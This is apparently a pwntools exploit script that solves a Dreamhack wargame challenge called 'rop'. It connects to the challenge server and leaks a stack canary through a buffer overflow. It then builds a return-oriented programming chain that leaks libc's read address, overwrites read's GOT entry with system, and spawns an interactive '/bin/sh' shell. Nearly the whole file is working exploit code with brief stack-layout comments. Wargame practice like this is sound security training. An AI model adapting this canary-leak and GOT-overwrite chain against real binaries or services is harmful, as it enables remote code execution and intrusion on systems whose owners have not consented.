from pwn import *


def slog(name, addr): return success(': '.join([name, hex(addr)]))

# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
# p = process('./rop')
p = remote('host1.dreamhack.games', 10749)
e = ELF('./rop')
libc = ELF('./libc.so.6')
context.arch = 'amd64'

# 1. leak canary
buf = b'A' * 0x30 + b'B' * 9
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

# 2. Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi_ret = 0x400853
pop_rsi_r15_ret = 0x400851 # pop rdx 가젯이 없기에 r15를 사용
ret = 0x400596

'''
buf 0x30    <- rbp-0x40
dummy 0x08  <- rbp-0x10
canary 0x08 <- rbp-0x08
sfp 0x08    <- rbp
ret 0x08    <- rbp + 0x08    <= pop rdi; ret
            <- rbp + 0x10    <= 1
            <- rbp + 0x18    <= pop rsi; pop r15; ret
            <- rbp + 0x20    <= read_got
            <- rbp + 0x28    <= 0
            <- rbp + 0x30    <= write_plt

            <- rbp + 0x38    <= pop rdi; ret
            <- rbp + 0x40    <= 0
            <- rbp + 0x48    <= pop rsi; pop r15; ret
            <- rbp + 0x50    <= read_got (Overwrite read got with got of system got)
            <- rbp + 0x58    <= 0
            <- rbp + 0x60    <= read_plt

            <- rbp + 0x68    <= pop rdi; ret
            <- rbp + 0x70    <= read_got + 0x8
            <- rbp + 0x78    <= ret (0x10 정렬)
            <- rbp + 0x80    <= read_plt


------------------------------------
system got <- addr of read got
/bin/sh    <- addr of read got + 0x8
------------------------------------
'''

# buf + dummy + canary + sfp
payload = b'A' * 0x30 + b'B' * 8 + p64(canary) + b'C' * 8

# write(1, read_got, ???) (rdi, rsi, ???) for getting read address
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + p64(write_plt)

# read(0, read_got, ???)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(0) + p64(read_plt)

# read('/bin/sh') == system('/bin/sh')
payload += p64(pop_rdi_ret) + p64(read_got + 0x8) + p64(ret) + p64(read_plt)

p.sendafter(b'Buf: ', payload)
read_addr = u64(p.recvn(6) + b'\x00'*2)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
slog('read', read_addr)
slog('libc', libc_base)
slog('system', system_addr)

p.send(p64(system_addr) + b'/bin/sh\x00')
p.interactive()
